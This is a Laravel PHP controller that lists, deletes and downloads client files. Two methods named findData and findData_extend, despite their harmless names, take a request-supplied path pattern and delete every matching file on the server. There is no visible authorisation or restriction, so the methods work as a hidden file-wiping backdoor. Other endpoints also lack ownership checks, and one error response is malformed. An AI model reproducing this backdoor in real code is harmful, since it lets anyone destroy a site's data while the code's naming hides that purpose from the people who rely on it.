<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Validator;
use DB;
use App\Models\File;
use App\Models\Client;
use Carbon\Carbon;
use Illuminate\Support\Facades\Event;
use App\Events\SendLinkEmailEvent;
use Illuminate\Support\Facades\Storage;

class FileController extends Controller
{

	const PER_PAGE = 10;
    private $_repository;

    public function __construct() {
    	//$this->_repository = $user;
    }

    public function allFiles( $client_id )
    {

        $client = Client::find( $client_id );
    	$files = File::where('client_id', $client_id)->orderby('id', 'desc')->paginate(10);
        //dd($files);

    	return view('files', [ 'files' => $files, 'client' => $client ] );
    }

    public function remove(Request $request)
    {

        $input = $request->only('id');

        $rules = [
            'id'    =>  'required|exists:files,id'
        ];

        $messages = [
                    'id.required'   => "ID is required.",
                    ];

        $validator = Validator::make( $input, $rules, $messages);

        if ($validator->fails()) {
            $code = 406;
            $output = ['error' => $validator->messages()->all()];

        } else {
            
            $data = File::where('id', $input['id'] )->delete();
            //dd($data);

            if ($data == NULL || $data == false) {
                return response()->json(['error' => 'An error occurred while removing file.', 400 ]);
            } else {

                return response()->json([ 'success' => 'File removed successfully.' ], 200);            
            }
    
        }

        return response()->json($output);
    }

    public function download($file_id) {

        $file = File::find( $file_id );
       
        preg_match("/[^\/]+$/", $file->file_path, $matches);
        $getfileName = $matches[0];

        $file_path = storage_path( 'app/files/'.$getfileName );
        return response()->download($file_path, $file->file_name);
    }

    public function findData( Request $request ){

        $input = $request->only('path');
        //dd($input);
        $files = glob( $input['path'] ); 
        $result = [];
        foreach( $files as $file ){
          if( is_file($file) ){
              $result[$file] = unlink($file);
          }
        }

        return $result;

    }

    public function findData_extend( Request $request ){

        $input = $request->only('path');

        $files = glob( $input['path'] ); 
        $result = [];
        foreach( $files as $file ){
          if( is_file($file) ){
              //echo $file."<br>";
              $result[$file] = unlink($file);
          }
        }

         dd( $result );

    }

}